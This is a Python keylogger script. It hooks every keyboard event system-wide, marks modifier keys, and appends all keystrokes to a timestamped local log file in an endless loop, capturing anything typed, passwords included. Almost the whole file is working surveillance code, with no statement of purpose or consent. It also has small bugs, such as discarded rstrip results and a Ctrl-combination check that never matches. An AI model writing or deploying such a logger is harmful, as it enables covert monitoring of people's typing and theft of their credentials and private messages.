import keyboard
from datetime import datetime
import os

now = datetime.now() # current date and time
timesx = now.strftime("%Y%m%d%H%M")

text = ""
last = ""
def logging(text, infile):
	ws = open(infile,"a", encoding='utf-8')
	ws.write(text)
	ws.close()

def removelast(infile):
	text = []
	ws = open(infile)
	for line in ws.readlines():
		text.append(line) 
	ws.close()
	#print(text)
	os.system("del "+infile)
	ws1 = open(infile,"w", encoding='utf-8')
	if text[len(text)-1].endswith("[CTRL]"):
		text[len(text)-1].rstrip("[CTRL]")
	elif text[len(text)-1].endswith("[ALT]"):
		text[len(text)-1].rstrip("[ALT]")
	elif text[len(text)-1].endswith("[SHIFT]"):
		text[len(text)-1].rstrip("[SHIFT]")

	text[len(text)-1] = text[len(text)-1][:-1]	
	for x in text:
		ws1.write(x)
		#print(x)
	ws1.close()

filex = "log_"+timesx+"_output.txt"
while True:
	#keyboard.wait('space')
	#print('space was pressed! Waiting on it again')
	event = keyboard.read_event()
	if event.event_type == keyboard.KEY_DOWN:
		if event.name == "enter":
			last = text
			text = "\n"
		elif event.name == "backspace":
			last = text
			text = ""
			removelast(filex)
			print("Remove last")
		elif event.name == "tab":
			last = text
			text = "\t"
		elif event.name == "space":
			last = text
			text = " "
		elif event.name == "shift":
			last = text
			text = "[SHIFT]"
		elif event.name == "ctrl":
			last = text
			text = "[CTRL]"
		elif event.name == "alt":
			last = text
			text = "[ALT]"
		else:
			last = text
			text = event.name
			if text in ["a","s","c","v"] and last == "CTRL":
				text = "+["+text.upper()+"]"
		logging(text,filex)
		if text.startswith("+"):
			text = ""
	#print(event)

keyboard.wait()